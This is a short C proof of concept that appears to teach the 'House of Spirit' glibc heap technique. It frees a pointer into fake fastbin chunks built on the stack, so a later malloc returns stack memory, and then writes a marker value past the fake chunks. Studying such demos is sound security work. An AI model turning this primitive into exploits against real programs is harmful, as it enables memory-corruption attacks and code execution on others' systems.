#include <stdlib.h>
#include <stdio.h>

struct fast_chunk {
  size_t prev_size;
  size_t size;
  struct fast_chunk *fd;
  struct fast_chunk *bk;
  char buf[0x20];                   // chunk falls in fastbin size range
};

int main (){

  struct fast_chunk fake_chunks[2];   // Two chunks in consecutive memory

  void *ptr;
  unsigned long long *victim;

  ptr = malloc(0x30);                 // First malloc
  fprintf(stderr, "Regular malloc address : %p\n", ptr);

  fake_chunks[0].size = sizeof(struct fast_chunk);
  fake_chunks[1].size = sizeof(struct fast_chunk);

  // Attacker overwrites a pointer that is about to be 'freed'
  ptr = (void *)&fake_chunks[0].fd;

  // fake_chunks[0] gets inserted into fastbin
  free(ptr);

  victim = malloc(0x30);
  fprintf(stderr, "Victim address : %p\n", victim);
  victim[17] = 0xdeadbeefbabe;
}
